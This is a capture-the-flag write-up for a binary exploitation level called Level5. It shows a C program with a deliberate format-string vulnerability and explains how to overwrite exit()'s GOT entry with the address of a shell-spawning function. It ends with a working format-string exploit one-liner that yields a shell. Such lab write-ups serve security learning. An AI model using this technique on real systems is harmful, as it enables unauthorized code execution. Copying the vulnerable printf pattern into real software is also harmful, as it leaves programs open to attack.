# Level5

## Code
```
#include <stdio.h>
#include <stdlib.h>

void o(void)
{
  system("/bin/sh");
  _exit(1);
}

void n(void)
{
  char buffer [512];
  fgets(buffer,512,stdin);
  printf(buffer);
  exit(1);
}

void main(void)
{
  n();
  return;
}
```
## Explanation
- Again, a call to fgets on a 512 bytes buffer, and a printf.

- This time, the solution is not behind a cmp instruction but in a o() function that is never called.

- So just like in one of the first exercise, we could replace the return value of the n() function with
    the address of the o() function... But the problem is that the n() function never returns since
    it calls exit() after the printf() !

- So here, we decided to modify the address where the the exit() function jumps to redirect our program
    towards the o() function when exit() is called !

- So what we need is the address of o() and the memory address of the GOT entry for exit(). These are
    very easy to get thanks to objdump -d :
```
[...]

080483d0 <exit@plt>:
    80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
    80483d6:	68 28 00 00 00       	push   $0x28
    80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>


[...]

080484a4 <o>:
    80484a4:	55                   	push   %ebp
    80484a5:	89 e5                	mov    %esp,%ebp
    80484a7:	83 ec 18             	sub    $0x18,%esp
    80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
    80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
    80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
    80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

[...]
```
- Here, we can see that the address of o() is 0x080484a4 and that the address where exit() jumps when
    called is found by dereferencing 0x8049838. So all we need to do is write the address of o() at this
    address instead, to make the program jump to o() when exit() is called, and prevent it from
    dynamically linking the original exit() c function.

- Once we have this information, we can use the exact same technique as level 4 to write the needed value
    (address of o()) at the needed address (GOT entry for exit()): 

# Exploit
```
$   (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' ; cat) | ./level5
```